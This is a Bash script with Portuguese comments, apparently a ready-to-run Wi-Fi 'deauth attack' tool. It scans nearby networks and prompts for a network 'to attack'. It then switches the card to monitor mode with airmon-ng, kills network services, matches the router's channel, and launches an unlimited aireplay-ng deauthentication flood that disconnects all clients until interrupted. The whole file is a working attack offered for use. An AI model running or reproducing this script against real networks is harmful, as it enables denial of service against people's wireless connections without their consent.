#!/bin/bash

# contributors: mel, cr0d, rck, kd

if [ "$EUID" -ne 0 ]
then echo "Necessita root."
    exit
fi


echo "

▓█████▄▓█████▄▄▄      █    ██▄▄▄█████▓██░ ██     ▄▄▄    ▄▄▄█████▄▄▄█████▓▄▄▄      ▄████▄  ██ ▄█▀
▒██▀ ██▓█   ▒████▄    ██  ▓██▓  ██▒ ▓▓██░ ██▒   ▒████▄  ▓  ██▒ ▓▓  ██▒ ▓▒████▄   ▒██▀ ▀█  ██▄█▒ 
░██   █▒███ ▒██  ▀█▄ ▓██  ▒██▒ ▓██░ ▒▒██▀▀██░   ▒██  ▀█▄▒ ▓██░ ▒▒ ▓██░ ▒▒██  ▀█▄ ▒▓█    ▄▓███▄░ 
░▓█▄   ▒▓█  ░██▄▄▄▄██▓▓█  ░██░ ▓██▓ ░░▓█ ░██    ░██▄▄▄▄█░ ▓██▓ ░░ ▓██▓ ░░██▄▄▄▄██▒▓▓▄ ▄██▓██ █▄ 
░▒████▓░▒████▓█   ▓██▒▒█████▓  ▒██▒ ░░▓█▒░██▓    ▓█   ▓██▒▒██▒ ░  ▒██▒ ░ ▓█   ▓██▒ ▓███▀ ▒██▒ █▄
 ▒▒▓  ▒░░ ▒░ ▒▒   ▓▒█░▒▓▒ ▒ ▒  ▒ ░░   ▒ ░░▒░▒    ▒▒   ▓▒█░▒ ░░    ▒ ░░   ▒▒   ▓▒█░ ░▒ ▒  ▒ ▒▒ ▓▒
  ░ ▒  ▒ ░ ░  ░▒   ▒▒ ░░▒░ ░ ░    ░    ▒ ░▒░ ░     ▒   ▒▒ ░  ░       ░     ▒   ▒▒ ░ ░  ▒  ░ ░▒ ▒░
   ░ ░  ░   ░   ░   ▒   ░░░ ░ ░  ░      ░  ░░ ░     ░   ▒   ░       ░       ░   ▒  ░       ░ ░░ ░ 
      ░      ░  ░    ░  ░  ░             ░  ░  ░         ░  ░                    ░  ░ ░     ░  ░   
       ░                                                                               ░              
"

#INTERFACE DA REDE
INTERFACE="$(sudo route | grep '^default' | grep -o '[^ ]*$')"
#ARQUIVO TEMPORÁRIO PARA GUARDAR A LISTA DE REDES ENCONTRADAS
ARQUIVOTMP=$(mktemp)

#RESTAURA A CONEXÃO DO COMPUTADOR
restaura-conexao()
{
    echo -n "Restaurando conexão... "
    sudo airmon-ng stop $INTERFACE"mon" 1> /dev/null
    sudo service network-manager start 1> /dev/null
    sleep 5
    echo "Concluído."
}

testa-modo-monitor()
{
    echo -n "Testando se o modo monitor está ligado... "

    if [ -z "$INTERFACE" ]; then
        #Se não foi possível pegar a interface de rede, ela está em modo monitor
        #Pega a interface que está rodando no modo monitor
        RestauraINTERFACE="$(sudo airmon-ng | grep "mon" | cut -f 2)"

        #Remove o 'mon' da interface de rede e a associa à variavel interface
        INTERFACE="${RestauraINTERFACE::-3}"

        restaura-conexao
    fi
    echo "Concluído."
    echo "Interface de rede: "$INTERFACE
}

#ESCANEIA AS REDES E MANDA PARA O ARQUIVO TEMPORÁRIO
escaneia-redes()
{
    echo -n "Escaneando redes... "
    sudo iwlist $INTERFACE scan | parse-iwl > $ARQUIVOTMP
    echo "Concluído."
}

#FUNÇÃO QUE TRANSFORMA O OUTPUT DO COMANDO IWLIST EM ALGO SIMPLES E LEGÍVEL
parse-iwl()
{
    while IFS= read -r line; do
        [[ "$line" =~ \(Channel ]] && {
            chn=${line##*nel };
            chn=${chn:0:$((${#chn}-1))};
        }
        [[ "$line" =~ ESSID ]] && {
            essid=${line##*ID:}
            echo "$essid;$chn"
        }
    done
}


# TESTANDO SE O PARÂMETRO FOI PASSADO
if [ $# -eq 0 ]; then
    testa-modo-monitor
    escaneia-redes
    echo ""
    echo "-- Redes encontradas: --"
    #Trata os resultados do arquivo temporário para mostrar apenas o nome das redes para o usuário da maneira mais simples e clara
    #também remove as aspas com o comando sed
    sudo cat $ARQUIVOTMP | cut -d";" -f1 | sed -e 's/^"//' -e 's/"$//'
    echo ""
    echo -n "Digite o nome da rede para atacar: "
    read REDE
# TESTANDO SE O USUÁRIO ENTROU COMANDO DE AJUDA
elif [ "$1" == "-h" ] || [ "$1" == "--help" ]; then     
    echo "Usage: $0 <INTERFACE>"
    exit 1
# USUÁRIO ENTROU A REDE À SER ATACADA COMO PARÂMETRO
else
    testa-modo-monitor
    escaneia-redes
    REDE=$1
fi



# PEGANDO CANAL DA REDE SELECIONADA
CH="$(sudo cat $ARQUIVOTMP | grep -i "$REDE" | cut -d";" -f2)"
echo "Canal da rede = $CH"


echo -n "Iniciando ferramentas de ataque... "
sudo airmon-ng start $INTERFACE 1> /dev/null
sudo airmon-ng check kill 1> /dev/null
echo "Concluído."


echo -n "Alterando canal da placa de rede para o mesmo do roteador... "
sudo wash -i $INTERFACE"mon" -c $CH -C -o /dev/null -D 2> /dev/null
#precisa dar um tempo para o wash alterar o canal em background
sleep 2
sudo pkill wash
echo "Concluído."


echo "Executando ataque..."

aireplay-ng -0 0 -e "$REDE" $INTERFACE"mon" 1> /dev/null &
trap " " SIGINT 
wait
kill $!
wait $! 2>/dev/null
echo ""
echo "Ataque finalizado!"
restaura-conexao
echo "Have a nice day!!!"
